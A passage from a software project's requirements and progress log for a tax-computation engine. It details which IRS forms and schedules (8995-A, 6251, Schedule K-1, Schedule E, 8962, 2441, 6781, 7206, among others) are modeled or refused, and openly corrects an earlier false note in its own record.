        incomes including the boundary and one cent below it, and line-by-line where the two
        pages carry the same quantity. Breaking the short-circuit by one cent reddens it.
      - **`vnd.fjs.business_expenses` gains three assertions** —
        `specifiedServiceTradeOrBusiness`, `w2Wages`, `unadjustedBasisOfQualifiedProperty` — in
        the same commit as the reader that uses them. Absence REFUSES by name and never
        defaults; below the threshold none of the three is read, so a Phase 28 return computes
        exactly what it always did.

      Still refused, and correctly: `qualifiedReitDividendsAndPtpIncome` (Form 8995 lines 6-9 /
      Form 8995-A lines 28-30), the patron reduction (line 14, Schedule D), the §199A(g) DPAD
      (line 38), a SECOND business (Schedule B aggregation), and Schedule A Part II's publicly
      traded partnership SSTB income. Each needs a document this engine does not read.

      *The Phase 28 record below is kept as history. Where it says Form 8995-A is unmodeled or
      that no SSTB field is stored, read the note above.*

      **PARTIALLY delivered 2026-08-16, and the box stayed unchecked because two of the three
      things this requirement names were not built.** Form **8995**, the simplified
      computation, is complete: all seventeen printed lines, reaching 1040 line 13a. Qualified
      business income is Schedule C net profit **reduced by the deductible half of
      self-employment tax** (§199A(c)(1)), which is the step most often missed and which lowers
      the deduction. Line 11's "taxable income before the QBI deduction" subtracts 1040 line 12
      **and line 13b**, because the 2025 face splits the old line 13 in two.

      Form **8995-A** is not modeled, so **the SSTB phase-in and the W-2-wage/UBIA limitations
      this requirement names do not exist**. Above §199A(e)(2)'s threshold ($197,300, or
      $394,600 on a joint return) the engine REFUSES by name, and the refusal states both
      limitations, the fact that a sole proprietor with no employees has no W-2 wages, and both
      directions the error would run. It fires only when there is qualified business income, so
      a high-income return with no business is untouched.

      Form 8995 lines 6-9, **qualified REIT dividends and PTP income**, are documented zeros:
      Form 1099-DIV box 5 is stored and read by nothing, and PTP income needs Schedule K-1
      (DOC-24, Phase 30). `qualifiedReitDividendsAndPtpIncome` is a new refused kind.

      **`vnd.fjs.business_expenses` gains one field**,
      `priorYearQualifiedBusinessLossCarryforward`. §199A(c)(2) carries a negative year forward
      and this engine holds one tax year; reading an absent carryforward as zero would overstate
      the deduction for the year-one-loss founder the section is written for, so absence is
      *unstated* and refuses, and `"0.00"` is the assertion that there was none.

      **No SSTB field is stored, deliberately.** §199A(d)(3) makes the SSTB question irrelevant
      below the threshold and the engine refuses above it, so the field would have no reader —
      the `box13StatutoryEmployee` defect Phase 27 found, avoided rather than repeated. It
      acquires a reader the day Form 8995-A is modeled.

      *(Phase 31 is that day. `specifiedServiceTradeOrBusiness` now exists, as one of two exact
      strings rather than a checkbox — absence must refuse, because DOC-12's convention reads
      absence as "no" and "no" is the answer that RAISES the deduction.)*

      **~~STILL OPEN after Phase 31~~ — CLOSED 2026-08-17.** The reason it stayed open was session
      budget and nothing else: Form 8995-A is a forty-line form plus four Schedules. It is now built
      to this repository's standard — transcribed from the fetched pages, wired, every `min`/`max`
      limb separated with a fixture where it binds, and each new proof watched to fail. **No scope
      kind needed reclassifying**: `qualifiedBusinessIncomeDeduction` was already moved to modeled in
      Phase 28, and the kinds that remain refused are the document-shortage ones listed above.

      `[RECORD CORRECTED — read this before trusting any recorded reason, including this one]` The
      first version of this note gave a different reason: that `f8995a.pdf` **could not be fetched**.
      **That claim was never tested and it is FALSE** — `curl -sSL https://www.irs.gov/pub/irs-pdf/f8995a.pdf`
      returns a 117,129-byte `%PDF-1.7` in one command, and the transcription below was taken from it.
      The claim was written from an assumption about the environment while that same session had
      already pushed twice over HTTPS. It is left visible rather than quietly overwritten because it
      is AGENTS.md's "Verifying a claim before you record it" failing in the exact shape that section
      warns about: **a recorded reason removes all pressure to look again**, so the next attempt would
      have skipped the fetch on this file's authority. Fetch `i8995a.pdf` too.

      *Transcribed from the printed `f8995a.pdf` face, "Form 8995-A (2025) Created 9/12/25". Forty
      lines, so the next attempt needs no recall:*

      - **Part I line 1**, per business A/B/C: (a) name, **(b) check if specified service**,
        (c) check if aggregation, (d) TIN, (e) check if patron. **The SSTB flag is a Part I
        checkbox** — which is the field `vnd.fjs.business_expenses` must acquire.
      - **Part II, Determine Your Adjusted Qualified Business Income** — 2 QBI; **3 line 2 × 20%,
        and its own printed short-circuit: *"If your taxable income is $197,300 or less ($394,600 if
        married filing jointly), skip lines 4 through 12 and enter the amount from line 3 on line
        13"*** (this is exactly Form 8995's simplified case, so the two forms must agree below the
        threshold — a cross-form leaf worth writing); 4 allocable share of W-2 wages; 5 line 4 × 50%;
        6 line 4 × 25%; 7 allocable share of UBIA; 8 line 7 × 2.5%; **9 lines 6 + 8**; **10 the
        GREATER of line 5 or line 9**; **11 the SMALLER of line 3 or line 10** (the wage/UBIA
        limitation); 12 the phased-in reduction from line 26; **13 the GREATER of line 11 or line
        12**; 14 patron reduction from Schedule D line 6; 15 line 13 − line 14; 16 total of line 15.
      - **Part III, Phased-in Reduction** — and note what it phases in: **the W-2-wage/UBIA
        limitation, NOT the SSTB reduction.** Its printed condition is *"Complete Part III only if
        your taxable income is more than $197,300 but not $247,300 ($394,600 and $494,600 if married
        filing jointly) **and line 10 is less than line 3***" — so it runs only where the limitation
        actually bites. 17 from line 3; 18 from line 10; 19 line 17 − line 18; 20 taxable income
        before the QBI deduction; **21 threshold $197,300 ($394,600 MFJ)**; 22 line 20 − line 21;
        **23 phase-in range $50,000 ($100,000 MFJ)**; 24 line 22 ÷ line 23, a PERCENTAGE; 25 line 19
        × line 24; 26 line 17 − line 25 → line 12.
      - **Part IV, Determine Your Qualified Business Income Deduction** — 27 from line 16; 28 REIT
        dividends and PTP income; 29 their prior-year carryforward; 30 combine 28 + 29, if less than
        zero enter -0-; 31 line 30 × 20%; 32 lines 27 + 31; 33 taxable income before the QBI
        deduction; 34 net capital gain increased by qualified dividends; 35 line 33 − line 34, if
        zero or less enter -0-; 36 line 35 × 20%; **37 the SMALLER of line 32 or line 36**; 38 the
        §199A(g) DPAD, not more than line 33 − line 37; **39 lines 37 + 38 → 1040 line 13a**;
        40 the REIT/PTP loss carryforward.
      - **The $50,000/$100,000 phase-in range is confirmed by printed line 23, and it is NOT
        indexed** — the threshold moves with inflation and the range does not, which is why the upper
        bound is exactly $247,300 = $197,300 + $50,000. It is a new hand-typed `fjs/tax/params` entry
        needing its own count-style proof, plus a proof that it is **not derived from the threshold**:
        25% of $197,300 is $49,325, not $50,000, so a reader who assumes a ratio is wrong by $675.
        (The earlier note cited §199A(e)(2) for the range; (e)(2) defines the THRESHOLD —
        §199A(b)(3)(B) is the wage/UBIA phase-in and §199A(d)(3) the SSTB one. The printed figures
        are the ones to trust here.)
      - **The SSTB reduction lives in Schedule A, not Part II.** Part II has no
        "applicable percentage" line at all — Schedule A (Form 8995-A), *Specified Service Trades or
        Businesses*, computes the REDUCED QBI, W-2 wages and UBIA that then feed lines 2, 4 and 7.
        Above threshold + range an SSTB's applicable percentage is zero, so all three are zero and
        the deduction vanishes. This corrects the earlier note, which put the multiplication in Part
        II.
      - **SSTB, W-2 wages and UBIA are all ASSERTED, and absence must REFUSE rather than default**,
        following `vnd.fjs.ira`'s `yearEndValueOfAllTraditionalSepSimpleIras` exactly: `"0.00"` is a
        real assertion that computes, absence is *unstated*. The SSTB gate must fire ONLY when
        determinative — above the threshold, which is where line 3's own short-circuit stops — or it
        breaks every existing below-threshold fixture. Defaulting is wrong in both directions: an
        SSTB read as non-SSTB overstates the deduction, and the reverse zeroes a legitimate one.
      - **The common case must be exercised, and it is the trap.** A sole proprietor with no
        employees has NO W-2 wages, so printed line 5 (50% of wages) is zero, line 6 is zero, and
        line 9 = line 8 = 2.5% of UBIA is the whole of line 10. A fixture must assert wages `"0.00"`
        with a NON-ZERO UBIA so that limb is what survives line 10's greater-of — otherwise line 10
        is zero because both limbs are, and the answer is right for the wrong reason.
      - **Fixtures must separate every limb**: line 10 where 50%-of-wages wins and where
        25%+2.5%-UBIA wins; line 11 where line 3 wins and where line 10 wins; line 37 where line 32
        wins and where line 36 wins; and the boundaries at $197,300 exactly (Form 8995 still
        applies), one cent above, $247,300 exactly, and one cent past — SSTB and non-SSTB, which
        diverge only past the range.
      - **Reclassify in the same commit as the wiring**: the `fjs/return/scope` kind currently
        refused for the above-threshold case moves from refused to modeled alongside it, and
        `formEightNineNineFiveAIsUnmodeled` NARROWS rather than disappears — a patron of an
        agricultural or horticultural cooperative (Schedule D, printed lines 14 and 38), aggregation
        (Schedule B) and the REIT/PTP limbs (lines 28-31) still refuse.

### Equity Compensation and AMT (DOC, TAX)

- [x] **DOC-22** *(M2, T2)*: `vnd.fjs.form3921` — ISO exercise. Not filed with the return, but
      it carries the exercise price and FMV that drive both the AMT preference and basis.
      **Delivered (Phase 29.)** Boxes 1-6, the two per-share prices exactness-checked and the
      share count through the new `fjs/document/share_count`. The spread `(box 4 − box 3) × box 5`
      reaches Form 6251 line 2i and thence 1040 line 17, following the printed instructions' own
      order of operations (each product rounded, the subtraction last). The basis half of the
      requirement is NOT delivered: the AMT basis increase this exercise creates is a multi-year
      fact, refused by name at `amtDispositionOfProperty` (Form 6251 line 2k).
- [x] **DOC-23** *(M2, T2)*: `vnd.fjs.form3922` — ESPP transfer, carrying what a qualifying vs
      disqualifying disposition needs.
      **Delivered (Phase 29.)** All eight boxes, audited one by one against this requirement's own
      standard in `everyBoxADispositionNeedsRoundTripsVerbatim` — both holding-period endpoints,
      both fair market values (the qualifying and disqualifying rules read DIFFERENT ones), the
      price paid, the lookback price in box 8 whose ABSENCE is a fact, and the share count.
      **Nothing computes from it, and it is not a stored document with no reader**: a stored Form
      3922 alongside any reported sale REFUSES the return, naming the three facts that are
      missing (which sale, qualifying or disqualifying, and whether the ordinary-income element is
      already inside Form W-2 box 1).
- [x] **TAX-33** *(M2, T3)*: **Form 6251**, Alternative Minimum Tax → Schedule 2 line 2. The
      hardest computation remaining in the project, and the reason an ISO exercise can generate
      tax on income never received.

      **The printed destination is line 2, not line 1, and this text has been corrected.** Every
      AMT reference says line 1, and that was true through TY2024; the TY2025 Schedule 2 (fetched
      2026-08-16) prints line 1 as "Additions to tax" (1a-1z) and line 2 as "Alternative minimum
      tax. Attach Form 6251". It matters: Form 6251 line 10 READS Schedule 2 line 1z, so an engine
      putting the AMT on line 1 would have the form reading its own output.

      **Phase 29 delivered Parts I and II; TAX-33 CLOSES with Part III.** What computes:
      lines 1a/1b, line 2a's standard-deduction add-back, line 2i's ISO spread, line 4's
      married-filing-separately add-back, the exemption and its 25% phase-out, the 26/28% schedule
      with its halved MFS breakpoint, and line 11's EXCESS over the regular tax — end to end, on a
      real fixture, at $292,479.00 of tax on income never received.

      **Part III now computes too** (`fjs/form6251/part3`), all twenty-nine printed lines
      12-40: the 0% band (line 23), 15% (line 31), 20% (line 34) and the 25% unrecaptured-§1250
      band (line 37), over either the regular tax's Qualified Dividends and Capital Gain Tax
      Worksheet or its Schedule D Tax Worksheet, threaded off the ONE `dispatchLine16` execution
      that produced 1040 line 16 rather than a second one. **The persona's own return — a
      $1,000,000.00 ISO spread beside $20,000.00 of qualified dividends — computes end to end
      through `form1040Report`**: $55,023.00 of regular tax, $293,195.00 of AMT, $348,218.00
      total. Part III is worth $2,600.00 on it, the qualified dividends taking §1(h)'s 15% rather
      than the AMT's flat 28%.

      **Phase 29's upper bound is unchanged and still runs first.** Part III's own line 40 takes
      the SMALLER of its result and the flat 26/28% figure, so that figure is a rigorous upper
      bound and the engine still returns an exact `$0.00` whenever the bound already loses to the
      regular tax — on the same code path it took before Part III existed, with
      `line7IsAnUpperBound` saying which path produced the answer. `fjs/form6251/part3` proves
      the stronger statement it rests on: line 38 never exceeds line 39 at any input, because
      every preferential rate the page charges is strictly below the AMT's own 26%.

      What still refuses, by name: Part III required while the regular tax completed **neither**
      preferential worksheet — reachable only when 1040 line 15 is zero or less — because lines
      13, 15, 20 and 27's no-worksheet fallbacks are an untranscribed printed rule and a wrong
      zero there would OVERSTATE the tax. Every Form 2555 clause on the page is structurally
      unreachable (`foreignEarnedIncomeForm2555` refuses at dispatch level 0). **Fourteen** — this said *fifteen* until 2026-08-17, before line 2g's `amtPrivateActivityBondInterest` moved into `modeledKinds` when Form 1099-INT box 9 arrived — §56/§57
      adjustments on Part I are also refused, each by its own kind and each naming the document
      or election that would supply it.
- [x] **TAX-34** *(M2, T2)*: **Form 8949 basis adjustment codes**, particularly code B for
      equity compensation. Brokers routinely report $0 or unadjusted basis on 1099-B for RSU
      and ESPP sales; without the adjustment the vested value is **taxed twice**. Form 8949
      already exists — this is the adjustment column and its codes, not a new form.
      **Delivered (Phase 29.)** All eighteen printed column (f) codes, in the table's own order,
      each with a TOTAL disposition — one emitted (B), two refused by name (D and W, each stating
      what a later phase has to decide), fifteen structurally unreachable with the input shape
      that would reach each one. Column (g) derives the printed worksheet's two presentations of
      one correction from box 12. **Nothing is adjusted that the taxpayer did not assert**: the
      correction is a stored `vnd.fjs.basis_correction` naming its Form 1099-B by CAS hash, and
      an assertion the engine cannot use is refused rather than dropped, in four different ways.
      The double taxation is PRICED end to end at **$49,467.75** of federal income tax on
      $150,000.00 of already-taxed wages.

### Pass-Through Income (DOC, TAX)

- [x] **DOC-24** *(M2, T3)*: `vnd.fjs.k1_1065` and `vnd.fjs.k1_1120s` — partnership and S-corp
      Schedule K-1. Two dialects, not one: the box numbering differs.
      **Delivered (Phase 30.)** Twenty-nine printed Part III fields on the 1065 face and
      twenty-two on the 1120-S, each compared against a hand-typed printed table in both
      directions. The "two dialects, not one" clause is *priced* rather than described: the two
      faces collide on printed boxes 4, 5, 6, 7, 8, 9 and 14, so a shared schema would read an
      S corporation's short-term capital gain as a partnership's royalty and would look for
      self-employment earnings in a box that, on the 1120-S face, holds a checkbox.
      `theBoxNumberingDiffersFromThePartnershipForm` and
      `theTwoScheduleK1SchemasAreNotTheSameSchema` are the two leaves that would redden if either
      dialect were ever "harmonised" onto the other's numbering.

      **Box 1 computes on both. Every other fixed-caption money box refuses by name when
      non-zero** — seventeen of eighteen on the 1065, twelve of thirteen on the 1120-S — each
      naming the real line elsewhere on the return it would have reached, because §702(a) and
      §1366(a)(1) require each separately stated item to be taken into account separately and a
      dropped one is an understatement.

      **1065 box G is a printed PAIR and exactly one tick is required.** §1402(a)(13) and
      §469(h)(2) both turn on partner type, and neither a general nor a limited default is
      available: the error is worth about 15.3% of 92.35% of the share in whichever direction it
      was made. A blob ticking neither or both is refused at storage.

      **The one field that is not a printed box** is the §469 material-participation
      determination, in a vocabulary shared by both dialects. It rides on the K-1 because §469 is
      applied activity by activity; absence is *unstated* and refuses at `fjs/schedule/e`; and
      §469(h)(2) OVERRIDES it for a limited partner, so an assertion of material participation
      beside a ticked "Limited partner" box is refused rather than honoured.

      The eight (1065) and six (1120-S) CODED boxes are arrays of `(code, amount)` rows, and their
      vocabulary belongs to `fjs/schedule/e` — the identical division `vnd.fjs.business_expenses`
      makes with `fjs/schedule/c`. A row's amount is absent-able, because box 20 code Z prints
      `STMT`.
- [x] **TAX-35** *(M2, T3)*: **Schedule E** Parts II and III → Schedule 1 line 5. A founder
      with a partnership stake or S-corp shares cannot file without it.

      **CLOSED.** Phase 30 delivered Part II; the `vnd.fjs.k1_1041` dialect and Schedule E Part
      III closed the second part; and the routing half — the last thing this entry stayed open
      for — is done. All three are checked claims below rather than descriptions.

      **Ticked because the routing genuinely computes**, in three slices, each with a fixture
      where the destination line moves by EXACTLY the K-1's contribution and a control where it
      does not move, and each asserting `boxPath` per box rather than a total. Sixteen boxes
      across three faces, at sixteen different box numbers:

      | Destination | 1065 | 1120-S | 1041 |
      |---|---|---|---|
      | 1040 line 2b, taxable interest | box 5 | box 4 | box 1 |
      | 1040 line 3b, ordinary dividends | boxes 6a and 6c | box 5a | box 2a |
      | 1040 line 3a, qualified dividends | box 6b | box 5b | box 2b |
      | Schedule D line 5, short-term | box 8 | box 7 | box 3 |
      | Schedule D line 12, long-term | box 9a | box 8a | box 4a |

      **Every row is a different box number on every face, and that is the whole hazard.** "Box
      5" means taxable interest on the 1065, the dividend pair on the 1120-S, and other
      portfolio and nonbusiness income — bound for Schedule E line 33 column (f), NOT 1040 line
      2b — on the 1041. The three destination tables are deliberately not shared, each dialect
      now carries a hand-typed `computedMoneyBoxes` as the independent side of a by-name
      "computed or refused, never both" partition, and the citations on 1040 line 2b are
      dialect-qualified because the 1041's interest box shares the 1099-INT's field name exactly.

      The partnership routes SIX boxes where the other two route five: `box6cDividendEquivalents`
      is a §871(m) payment TREATED as a dividend rather than a slice of box 6a, so it is a
      genuine second summand of line 3b. Its opposite, `box4cTotalGuaranteedPayments`, is the
      printed total of boxes 4a and 4b and stays refused for exactly that reason.

      **The 28%-rate and unrecaptured-§1250 boxes stay refused** (1065 9b/9c, 1120-S 8b/8c, 1041
      4b/4c) — components of the long-term figure bound for two worksheets this engine computes
      from Form 1099-DIV boxes 2d and 2b only. Routing 9a while accepting 9b would put a
      collectibles gain into Schedule D line 15 at the ordinary long-term rate.

      **The capital-gain slice could not ship without an eighth tripwire, and that is the part
      worth remembering.** Lines 2b/3a/3b compute unconditionally, so routing to them is safe;
      Schedule D does not — `filingScheduleD` is read VERBATIM off the declared kind and never
      off document presence (12.1-CONTEXT.md Decision 1.6). Routing six boxes into a
      declaration-gated schedule would have converted a loud storage refusal into a SILENT
      understatement for any filer who did not declare `capitalGainsOrLosses`. `fjs/return/tripwire`
      now treats a non-zero K-1 capital-gain box as proof of that obligation, and
      `modeledKindDeclarationRemedies` names the remedy. **Routing a box is not finished when the
      destination computes; it is finished when the destination is REACHABLE.**

      What computes: Part II lines 27-32 from both K-1 dialects, and Part V's line 41, which is
      the destination the requirement names. Line 41 combines printed lines 26, 32, 37, 39 and 40,
      four of them documented zeros **when TAX-35 shipped — TWO today**, because Part III started
      computing in this same requirement and Part I did later, with `vnd.fjs.rental_property` and
      `fjs/schedule/e/part_i`. It reaches **Schedule 1 line 5 → 1040 line 8 through
      Schedule 1's own Part I total** rather than by a side channel. The founder's
      self-employment tax is charged or not charged according to the entity: a general partner's
      1065 box 14 code A reaches printed Schedule SE line 2, which names that box in its own
      caption, and an S-corporation shareholder's share never does (Rev. Rul. 59-221). The pair
      is priced end to end at **$11,303.64 against $0.00** on the same $80,000.00, with the
      Schedule E halves asserted EQUAL so that "the only difference is the entity type" is a
      checked claim rather than a description.

      *(**Phase 30 record, kept as history.** Where the paragraph below says Part III is a
      documented zero and no third K-1 was built, read this entry's own header instead: the
      `vnd.fjs.k1_1041` dialect and Schedule E Part III shipped afterwards, and columns (d) and (f)
      carry real readings. Marked 2026-08-17.)*

      What did not, at the time: **Part III**, estates and trusts, which needs a Schedule K-1 (Form 1041) —
      a THIRD Schedule K-1 with its own box numbering again, where a beneficiary's box 5 is other
      portfolio income and a partner's box 5 is interest. This phase built the two dialects
      DOC-24 asked for and deliberately did not guess a third from them, because guessing a box
      numbering is the exact failure DOC-24 exists to prevent. Part III's printed lines are
      modeled here as documented zeros so line 41 adds them, and a beneficiary is refused by name.

      Parts I (rental real estate and royalties), IV (REMICs) and Part V's own line 40 (Form
      4835) are outside this requirement and each refuses by name through its own declared kind —
      the coarse `rentalRealEstateRoyaltiesPartnershipsSCorps` is split into **five**
      per-Schedule-E-part kinds, so a filer with rental property is told that Part I is what is
      missing rather than being refused for "Schedule E".

      **A LOSS refuses, per row**, consistently with Phase 27's Schedule C decision and for one
      more reason than it had: §704(d)/§1366(d) basis is a multi-year history the K-1's own
      §704(b) capital-account box is not, and §465 and §469 stand behind it exactly as they do on
      Schedule C line 32. Per row rather than on the line-32 total, because netting one entity's
      loss against another's profit before testing either is the arithmetic §704(d) exists to
      stop.

      **§199A is wired only in the direction that is honest.** A PRESENT 1065 box 20 code Z or
      1120-S box 17 code V refuses, because the components live on an attached statement this
      engine does not hold; an ABSENT one computes, under Reg. §1.199A-6(b)(3)(iii)'s presumption
      that an unreported share of positive qualified business income is zero.

      **What still refuses by name, which is what the requirement asked for**: the rentals, the
      royalties, the guaranteed payments, the §1231 gain, the §179 deduction, the foreign taxes,
      the two capital-gain worksheet slices on each face, the 1041's box 5 portfolio income and
      its box 10 estate-tax deduction. Each quotes the printed *"Report on"* destination, so a
      filer holding one is told which line this engine cannot fill rather than having the amount
      dropped.

### Tier-B Forms (TAX) — four IDs coined in code, retrofitted here

**Retrofitted 2026-08-19, and recorded as retrofitted**, exactly as DOC-18 and TAX-18 were.
`TAX-36` through `TAX-39` were coined by four separate pieces of work as code-local handles
and cited in **21 files** under `fjs/**` — sources and `todo/` specs alike — while the highest
ID this document traced was `TAX-35`. Nothing could see that:
`planning-truth-gate.test.js` checked that every requirement here is traced and that every
traced ID has a body — **never that an ID the code CITES exists at all.** That gate now runs in both directions, and these four entries are what
makes the new direction green. The IDs are assigned after the fact and the fact is stated,
because the value of this table is that its history is true, not that it is tidy.

**None of the four has a ROADMAP phase, and inventing one would be the tidy lie.** All four
landed after every persona in this milestone had closed, as Tier-B form work rather than as a
planned slice; the `Phase` column below says so instead of pointing at a phase that was never
written. They are **T3** for the same reason — none of them was blocking anything.

> **`TAX-38` names TWO unrelated forms, and that is the finding this retrofit exists to
> record.** `feature/form-2441` coined it for Form 2441 on 2026-08-18 22:10; `feature/form-6781`
> coined it for Form 6781 on 2026-08-19 01:58, on a branch that already contained the first
> commit. The second author *did* check — the spec at
> `fjs/form6781/todo/section-1256-contracts-marked-to-market.md` says so — but checked with a
> grep "across every markdown file in the repo", and Form 2441's claim lived in `.f.js` files a
> markdown-only grep cannot see. **The registry that would have answered the question is this
> file**, which is precisely what the new gate forces the next coiner to consult.
>
> The entry below therefore describes both works under one ID rather than splitting them.
> Splitting requires renumbering **61 citations across fourteen files**, six of which name both
> forms, and two live branches are editing those files right now — so the split belongs to
> whoever integrates them, not to the retrofit that found it. What is recorded here is the state
> the tree is actually in.

- [x] **TAX-36** *(M2, T3)*: **Schedule 3 line 1 — the foreign tax credit, under §904(j) and
      only under §904(j)** → 1040 line 20. `box7ForeignTaxPaid` on `vnd.fjs.1099div` and
      `box6ForeignTaxPaid` on `vnd.fjs.1099int` had been stored and read by **nothing** since
      those two dialects shipped, so anyone holding an international index fund had the box
      dropped in silence.

      **Delivered.** `foreignTaxCredit` moved into `fjs/return/scope`'s `modeledKinds`, in the
      same commit as the `fjs/schedule/3` line 1 wiring. Spec:
      `fjs/schedule/3/todo/foreign-tax-credit.md`.

      **§901 allows the credit and §904(a) limits it; computing that limitation is what Form
      1116 is, and this engine does not model Form 1116.** §904(j)(2) is the exemption that
      makes a computable line, and its three conditions are CONJUNCTIVE: (A) the entire
      foreign-source gross income is qualified passive income shown on a payee statement, (B)
      the creditable foreign taxes do not exceed $300, or $600 on a joint return, and (C) the
      individual elects. **Exactly one of the three is verifiable here** — (B), against
      `fjs/tax/params`' own `foreignTaxCreditDeMinimisElection`. (A) is unobservable, because no
      1099 states how much of its income was foreign-source or which §904(d) category it fell
      in, and (C) is a choice rather than a fact, and a costly one: §904(j)(1)(C) forbids
      carrying an electing year's excess taxes back or forward. So (A) and (C) both ride on ONE
      taxpayer assertion, `section904jElectionAllForeignIncomeIsQualifiedPassiveIncome` on
      `vnd.fjs.return_profile`, whose name states both halves.

      **Above the ceiling, or without the election, the line REFUSES rather than zeroing**, and
      carries the taxpayer's own figures — the $847.00 they have and the $300.00 they would have
      had to be under. Zeroing would silently delete a credit they are owed; computing would
      claim one whose §904(a) limitation nobody computed. **A small amount is not evidence the
      conditions hold**: $12.00 of foreign tax is perfectly consistent with a filer who also
      earned foreign wages, for whom (A) fails at any figure.

      The one hole is already shut: the §904(j)(2)(B) threshold is on the taxpayer's TOTAL
      creditable foreign taxes, and the only other foreign-tax box in the document set —
      `box21ForeignTaxesPaidOrAccrued` on `vnd.fjs.k1_1065` — is refused by name at validation
      whenever it is non-zero, before a return can reach this schedule.
- [x] **TAX-37** *(M2, T3)*: **Form 8962, the Premium Tax Credit**, over a new `vnd.fjs.1095a`
      dialect — the twenty-sixth. **One execution, TWO destinations, and neither ships alone**:
      Form 8962 line 26, the net PTC, reaches Schedule 3 line 9 → 1040 line 31 and increases the
      refund; line 29, the excess advance PTC repayment, reaches Schedule 2 line 1a → 1040 line
      17 and increases the tax. Exactly one is ever non-zero, and **both were hard zeros**, so
      the engine neither credited an under-advanced enrollee nor collected from an over-advanced
      one.

      **Delivered.** `netPremiumTaxCredit` and `excessAdvancePremiumTaxCreditRepayment` are both
      in `modeledKinds`, reclassified in the same commit as the `fjs/form1040/core` wiring that
      runs the form ONCE and hands its two finished figures to the two schedules — the shape
      `foreignTaxCreditLine` already set. Neither could be reclassified without the other,
      because the two are one comparison (line 24 against line 25). §36B(b)(3)(A)'s
      applicable-figure table and the federal poverty line table live in `fjs/tax/params` with
      their citations.

      **The coarse `advancePremiumTaxCreditAndOtherRepayments` kind was split into three**,
      because Schedule 2 lines 1b through 1f are Forms 8936 and 4255 and nothing stored
      distinguishes them from line 1a — modeling the coarse kind would have handed a
      clean-vehicle-credit repayer a zero while telling them the kind was in scope. This work
      also found that **a refusal row named the wrong form**: Schedule 2 line 19 is a Form 4255
      elective-payment-election recapture with no connection to Form 8962, and the row that
      claimed otherwise was corrected in place rather than deleted.

      **Both the annual and the monthly path are implemented, and the printed line 10 test
      chooses** — they do not agree, because monthly column (c) is the annual figure divided by
      twelve AND ROUNDED, and the per-month `min(a, d)` cap does not commute with the annual
      one. Nine printed conditions REFUSE by name at the form, each naming what is missing and
      where the amount would have gone; the two a reader will assume away are a missing or zero
      column B (the SLCSP premium, which the instructions send the taxpayer to Pub. 974 or the
      HealthCare.gov Tax Tool for) and any dependent at all without the profile's certification
      that no dependent is required to file. **Form 8962's modified AGI is a THIRD one** —
      i8962 Worksheet 1-1 adds tax-exempt interest, Form 2555 lines 45 and 50, and the
      nontaxable part of Social Security — which is TAX-15's no-shared-`magi`-identifier rule
      applying with full force.
- [x] **TAX-38** *(M2, T3)*: **One ID, two forms** — see the note above. Both landed; the ID
      collision is recorded rather than retconned.

      **Form 2441 — the Credit for Child and Dependent Care Expenses**, and the taxable
      dependent care benefits beside it. TWO functions, because 1040 line 1e sits INSIDE this
      form's own line 7: `dependentCareBenefits` (Form W-2 box 10 → f2441 line 26 → 1040 line
      1e) and `dependentCareCredit` (f2441 line 11 → Schedule 3 line 2 → 1040 line 20). **Box 10
      was stored and read by nothing**, so the zero on 1040 line 1e was a silent understatement
      of tax for every taxpayer with a dependent care FSA — the third stored-but-unread box this
      project has found. The credit is **not refundable for 2025**, and the printed form says so
      twice: line 11 sends it to Schedule 3 Part I, Nonrefundable Credits, and the slot ARPA's
      2021 Part II line 10 occupied now holds a tax-liability limit.

      **Form 6781 Part I — gains and losses from section 1256 contracts**, marked to market.
      Box 11 of every stored Form 1099-B becomes a line 1 row; §1256(a)(3) splits the net into a
      40 percent short-term half (line 8) and a 60 percent long-term half (line 9), which reach
      `fjs/schedule/d`'s printed lines 4 and 11 — **both documented zeros until this work**. The
      stored box 11 is cross-checked against box 8 − box 9 + box 10 and neither side is
      preferred: a disagreement refuses the document, following `vnd.fjs.1095a`'s own line 33
      precedent. **Nothing joined `modeledKinds` and nothing left the refusal table**: §1256
      contracts had NO kind at all before this, so a futures trader declared
      `capitalGainsOrLosses` and every part of Form 6781 the engine cannot do fell through the
      guard in silence. Two refused kinds now name those parts —
      `straddleGainsAndLosses` (Parts II and III need per-position records the 1099-B reports
      only in AGGREGATE) and `netSectionTwelveFiftySixContractsLossCarryback` (§1212(c) carries
      back three years of returns this engine does not hold) — taking the refused count
      **141 → 143**, and the vocabulary 195 → 197. **The number going up is not the wrong
      direction**: adding a refused kind where there was silence raises honesty with it. A
      disjunct was added to `fjs/return/tripwire`'s existing `capitalGainsOrLosses` row in the
      same commit — not an eleventh tripwire — so a non-zero 1099-B box 11 is itself proof of
      that declaration obligation rather than a destination reached only if the filer knew to
      declare it.
- [x] **TAX-39** *(M2, T3)*: **Schedule 1 line 17 — the self-employed health insurance
      deduction, §162(l)** — through **Form 7206**, every printed line 1 through 14 named and
      computed, reaching 1040 line 10 and also Form 8995 line 1c through §199A(c)(1). Spec:
      `fjs/schedule/1/todo/self-employed-health-insurance.md`.

      **Delivered.** `selfEmployedHealthInsuranceDeduction` left `unmodeledKindRefusals` for
      `modeledKinds` (`143 → 142` on the refused count). **What made it computable was not an
      ordering change** — every figure Form 7206 reads was already in scope where Schedule 1
      line 17 is built. It was six `vnd.fjs.adjustments` line tags (Form 7206's printed line 1
      and its five §213(d)(10) age bands, whose limits are now in `fjs/tax/params`) plus one
      profile certification, `notEligibleForAnySubsidizedEmployerHealthPlanInAnyMonth`
      (§162(l)(2)(B)). **No dialect was added.**

      **The finding is about remedies, not about this line: Publication 535 does not exist.**
      Every prior statement in this repository about Schedule 1 line 17 — `fjs/return/scope`'s
      refusal row and `fjs/form8995`'s docstring quoting it — sent the reader to the *Pub. 535
      self-employed health insurance deduction worksheet*, which the IRS discontinued after
      2022. The row had already been repaired **twice**, by Phase 27 and by Phase 28, and both
      repairs left that first clause untouched because nobody re-read it. **A remedy that names
      an external source has an expiry the repository cannot see, and the clause least likely to
      be re-read is the one that has been true longest.** Form 7206 rather than the 1040
      instructions' three-line worksheet is a decision: p. 95 sends a filer to the form when
      qualified long-term-care premiums are in play, which this engine models, and the two pages
      disagree in the multi-business case.

      Line 17 **refuses a return holding both §162(l) premiums and Marketplace coverage**, for
      Rev. Proc. 2014-41 §2.05's circularity between this deduction and the premium tax credit —
      which is TAX-37's form, and the one interaction between these four entries.

### Form 461 (TAX-40) — one ID coined WITH its code, not retrofitted

The four entries above were retrofitted after the fact and say so. This one is not: it was
assigned in the same commit as `fjs/form461`, which is what the section above argues should
happen from now on. It has no ROADMAP phase either, for the same reason — Tier-B form work
rather than a planned slice.

- [x] **TAX-40** *(M2, T3)*: **Form 461, the §461(l) excess business loss limitation** — all
